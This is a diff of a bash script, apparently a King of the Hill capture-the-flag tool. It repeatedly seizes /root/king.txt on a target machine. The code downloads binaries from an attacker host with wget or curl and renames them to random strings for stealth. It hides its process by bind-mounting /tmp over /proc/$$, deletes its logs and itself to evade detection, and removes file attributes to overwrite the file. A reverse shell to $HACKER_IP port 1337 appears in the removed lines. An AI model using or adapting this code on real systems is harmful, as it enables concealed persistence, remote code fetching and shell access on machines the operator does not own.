@@ -83,64 +83,105 @@ CURL=/usr/bin/curl
 
 if [ -f "$WGET" ]; then
 	chmod u+x /usr/bin/wget
-	wget http://$HACKER_IP:8080/busybox_GREP
-	wget http://$HACKER_IP:8080/busybox_ECHO
-	wget http://$HACKER_IP:8080/busybox_CHATTR
-	wget http://$HACKER_IP:8080/busybox_CHMOD
-	wget http://$HACKER_IP:8080/busybox_CAT
-	wget http://$HACKER_IP:8080/busybox_MOUNT
+	wget http://$HACKER_IP:8090/busybox_GREP
+	wget http://$HACKER_IP:8090/busybox_ECHO
+	wget http://$HACKER_IP:8090/busybox_CHATTR
+	wget http://$HACKER_IP:8090/busybox_CHMOD
+	wget http://$HACKER_IP:8090/busybox_CAT
+	wget http://$HACKER_IP:8090/busybox_UMOUNT
 elif [ -f "$CURL" ]; then
 	chmod u+x /usr/bin/curl
-	curl http://$HACKER_IP:8080/busybox_GREP > busybox_GREP
-	curl http://$HACKER_IP:8080/busybox_ECHO > busybox_ECHO
-	curl http://$HACKER_IP:8080/busybox_CHATTR > busybox_CHATR
-	curl http://$HACKER_IP:8080/busybox_CHMOD > busybox_CHMOD
-	curl http://$HACKER_IP:8080/busybox_CAT > busybox_CAT
-	curl http://$HACKER_IP:8080/busybox_MOUNT > busybox_MOUNT
+	curl http://$HACKER_IP:8090/busybox_GREP > busybox_GREP
+	curl http://$HACKER_IP:8090/busybox_ECHO > busybox_ECHO
+	curl http://$HACKER_IP:8090/busybox_CHATTR > busybox_CHATR
+	curl http://$HACKER_IP:8090/busybox_CHMOD > busybox_CHMOD
+	curl http://$HACKER_IP:8090/busybox_CAT > busybox_CAT
+	curl http://$HACKER_IP:8090/busybox_UMOUNT > busybox_UMOUNT
 else
 echo "Both 'wget' and 'curl' are not presented on the machine or cannot be executed."
 echo "Abording.."
 exit 1
 fi
 
+# Renaming all bind to random strings for better stealth
+chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+
+GREP=
+for i in {1..5} ; do
+    GREP+=${chars:RANDOM%${#chars}:1}
+done
+
+ECHO=
+for i in {1..6} ; do
+    ECHO+=${chars:RANDOM%${#chars}:1}
+done
+
+CHATTR=
+for i in {1..7} ; do
+    CHATTR+=${chars:RANDOM%${#chars}:1}
+done
+
+CHMOD=
+for i in {1..8} ; do
+    CHMOD+=${chars:RANDOM%${#chars}:1}
+done
+
+CAT=
+for i in {1..9} ; do
+    CAT+=${chars:RANDOM%${#chars}:1}
+done
+
+UMOUNT=
+for i in {1..10} ; do
+    UMOUNT+=${chars:RANDOM%${#chars}:1}
+done
+
 # Rename them bins!
-mv -v busybox_GREP grep
-mv -v busybox_ECHO echo
-mv -v busybox_CHATTR chattr
-mv -v busybox_CHMOD chmod
-mv -v busybox_CAT cat
+mv -v busybox_GREP $GREP
+mv -v busybox_ECHO $ECHO
+mv -v busybox_CHATTR $CHATTR
+mv -v busybox_CHMOD $CHMOD
+mv -v busybox_CAT $CAT
+mv -v busybox_UMOUNT $UMOUNT
 
 # All this stuff needs to be executable
-chmod u+x kingme.sh
-chmod u+x grep
-chmod u+x echo
-chmod u+x chattr
-chmod u+x chmod
-chmod u+x cat
+chmod u+x $GREP
+chmod u+x $ECHO
+chmod u+x $CHATTR
+chmod u+x $CHMOD
+chmod u+x $CAT
+chmod u+x $UMOUNT
 
 # Hide from visible processes
-$WORKING_DIR/echo "Current PID:" $$
-$WORKING_DIR/echo "Hiding.."
+$WORKING_DIR/$ECHO "Current PID:" $$
+$WORKING_DIR/$ECHO "Hiding.."
 mount -o bind /tmp /proc/$$
 
+# Remove all wget-log files
+rm -f $WORKING_DIR/wget-*
+
+# This script will delete itself, so it cant be find with find or grep command!
+script_name="$(basename $0)"
+rm -f ./$script_name
 
 # Forever take your rightful throne as king!!!
+$WORKING_DIR/$ECHO -e "\n\nPress Enter to continue..\n"
+
 while true
 do
-	if $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then
-		$WORKING_DIR/echo $HACKER_NAME "is king! Nothing to do!"
+	if $WORKING_DIR/$GREP -q $HACKER_NAME /root/king.txt; then
+	sleep 0.3
 	else
-		LOSER=$($WORKING_DIR/cat /root/king.txt)
-		$WORKING_DIR/echo $LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
-		umount -l /root
-		$WORKING_DIR/chattr -ai /root/king.txt
-		$WORKING_DIR/chmod u+w /root/king.txt
+		LOSER=$($WORKING_DIR/$CAT /root/king.txt)
+		$WORKING_DIR/$ECHO -e "\n\n"$LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
+		$WORKING_DIR/$UMOUNT -l /root 2>/dev/null
+		$WORKING_DIR/$CHATTR -ai /root/king.txt
+		$WORKING_DIR/$CHMOD u+w /root/king.txt
 		set +o noclobber /root/king.txt
-		$WORKING_DIR/echo $HACKER_NAME > /root/king.txt
-		$WORKING_DIR/chattr +ai /root/king.txt
+		$WORKING_DIR/$ECHO $HACKER_NAME > /root/king.txt
+		$WORKING_DIR/$CHATTR +ai /root/king.txt
 		set -o noclobber /root/king.txt
-                sh -i >& /dev/tcp/$HACKER_IP/1337 0>&1
-
+                $WORKING_DIR/$ECHO -e $HACKER_NAME "is king! Nothing to do!\n"
 	fi
-	sleep 1
+	sleep 0.5
 done
